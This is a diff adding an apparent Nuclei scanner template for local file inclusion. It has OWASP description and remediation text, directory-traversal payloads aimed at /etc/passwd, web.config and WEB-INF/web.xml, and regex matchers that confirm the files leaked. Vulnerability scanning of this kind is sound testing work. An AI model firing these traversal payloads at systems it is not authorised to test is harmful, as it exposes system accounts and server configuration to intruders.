@@ -1,0 +1,61 @@
+id: {{.Name}}
+info:
+  name: LFI-{{.Name}}
+  author: Samalas From Lombok
+  severity: high
+  tags: LFI
+  
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 7.2
+  
+  reference: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
+  
+  description: |
+    Local file inclusion (also known as LFI) is the process of including files, that are already locally present on the server, through the exploiting of vulnerable inclusion procedures implemented in the application. This vulnerability occurs, for example, when a page receives, as input, the path to the file that has to be included and this input is not properly sanitized, allowing directory traversal characters (such as dot-dot-slash) to be injected
+  
+  remediation: |
+    The most effective solution to eliminate file inclusion vulnerabilities is to avoid passing user-submitted input to any filesystem/framework API. If this is not possible the application can maintain an allow list of files, that may be included by the page, and then use an identifier (for example the index number) to access to the selected file
+  
+  metadata:
+    search-query: {{ .Key }}
+
+self-contained: true
+requests:
+  - raw:
+      - |
+        {{ .Raw }}
+
+    payloads:
+      path:
+        - '/../../../../../../../../../etc/passwd'
+        - './web.config'
+        - '../web.config'
+        - '../../web.config'
+        - './WEB-INF/web.xml'
+        - '../WEB-INF/web.xml'
+        - '../../WEB-INF/web.xml'
+
+    
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*?:[0-9]*:[0-9]*:'
+
+      - type: word
+        part: body
+        words:
+          - 'for 16-bit app support'
+
+      - type: regex
+        part: body
+        regex:
+          - '(<web-app[\s\S]+<\/web-app>)'
+
+      - type: regex
+        part: body
+        regex:
+          - '(<system.webServer[\s\S]+<\/system.webServer>)'
